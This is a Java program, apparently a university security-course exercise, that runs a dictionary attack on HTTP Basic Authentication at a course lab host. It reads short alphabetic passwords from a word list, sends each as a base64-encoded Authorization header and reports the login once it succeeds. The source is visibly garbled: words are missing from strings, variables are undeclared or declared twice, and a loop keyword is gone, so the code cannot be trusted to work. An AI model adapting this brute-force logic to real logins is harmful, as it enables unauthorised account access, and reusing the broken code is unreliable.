



























import java.io.*;
import java.net.*;
import java.net.URL;
import java.net.URLConnection;
import java.util.*;

public class Dictionary {

   public static void main(String[] args) throws IOException {

      
      int begin, end, total;
      time = System.currentTimeMillis(); 

      
      String username = "";
      String password = null;
      String host = "http://sec-crack.cs.rmit.edu./SEC/2/";

      
      String dict = "words"; 
      File file = new File(dict);

      
      
      String letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
      int lettersLen = letters.length(); 
      int passwordLen=3; 
      String character = ""; 
      String letter = ""; 

      int passwords=0; 
      int twoChar=0; 

      url.misc.BASE64Encoder base = new url.misc.BASE64Encoder();
      

      
      String authenticate = ""; 
      String realm = null, domain = null, hostname = null;
       header = null; 

      
      int responseCode;
      String responseMsg;

      
      boolean characterValid=false; 
      boolean passwordValid=true; 

      
      int tryLen=0;
      int i=0;

      if (!file.exists() || file==null) {
   	     

         System.out.println ("Idiot, why dont  check and make sure the dictonary file exists.");
		 System.out.println ("I'm trying  find " + dict + " and I 't find it in the current directory.");
         System.exit(0);
      }


      try {
         
         BufferedReader reader = new BufferedReader(new FileReader(file));

         System.out.println("Dictionary Attack  " + host + " has commenced.");

         int i=1; 
         int k=1; 

          {
               
               URL url = new URL(host);
               HttpURLConnection httpConnect = (HttpURLConnection) url.openConnection();

               
               if(realm != null) {
                        String inLine = reader.readLine();

                        if ( inLine !=null) {
                           passwordValid = true; 

                           password = inLine;
                           tryLen = password.length();

                           if(tryLen <= passwordLen) {
                              
                              
                              

                              for (int z=0; z<tryLen; z++) {
                                 
                                 character = password.substring(z, (z+1));
                                 characterValid=false; 

                                 for (int y=0; y<lettersLen; y++) {
                                    
                                    letter = letters.substring(y, (y+1));

                                    if(letter.compareTo(character)==0) {
                                       
                                       characterValid=true;
                                    }
                                 }  

                                 if (characterValid==true && passwordValid==true) {
                                    
                                 } else {
                                    
                                    passwordValid = false;
                                 }
                              } 

                              if (passwordValid==true) {
                                 
                                 
                                 
                                 authenticate = username + ":" + password;
                                 authenticate = new String(base.encode(authenticate.getBytes()));
                                 httpConnect.addRequestProperty("Authorization", " " + authenticate);
                                 k++; 
                              }
                           } 
                        }

                  i++; 

               } 

               
               httpConnect.connect();

               
               realm = httpConnect.getHeaderField("WWW-Authenticate");
               if (realm != null) {
                  realm = realm.substring(realm.indexOf('"') + 1);
                  realm = realm.substring(0, realm.indexOf('"'));
               }

               hostname = url.getHost();

               
               responseCode = httpConnect.getResponseCode();
               responseMsg = httpConnect.getResponseMessage();

               
               
               if (responseCode == 200) {
                  
                  end = System.currentTimeMillis();
                  total = (end - start) / 1000; 

                  System.out.println ("Sucessfully Connected  " + url);
                  System.out.println("Login Attempts Required : " + k);
                  System.out.println("Time Taken in Seconds : " + total);
                  System.out.println ("Connection Status : " + responseCode + " " + responseMsg);
                  System.out.println ("Username : " + username);
                  System.out.println ("Password : " + password);
                  System.exit( 0 );
               } else if (responseCode == 401 && realm != null) {
                  
                  
                  
               } else {
                  
                  
                  System.out.println ("What the?... The server replied with  unexpected reponse." );
                  System.out.println (" Unexpected Error Occured While Attempting  Connect  " + url);
                  System.out.println ("Connection Status: " + responseCode + responseMsg);
                  System.out.println ("Unfortunately the password could not  recovered.");
                  System.exit( 0 );
              }

         }  while(realm != null); 

      } catch(MalformedURLException e) {
           System.out.println("Opps, the URL " + host + " is not valid.");
           System.out.println("Please check the URL and try again.");
      } catch(IOException e) {
         System.out.println("Grrrrrr, I'm sick of  trying  get me   the unattainable.");
         System.out.println("I'm unsure about what the problem is as the error is unknown.");
         System.out.println("Either I 't open the dictionary file,  I 't connect  " + hostname + ".");
         System.out.println("Now  away and leave me alone.");
         
         System.exit(0);
      } 
   }
}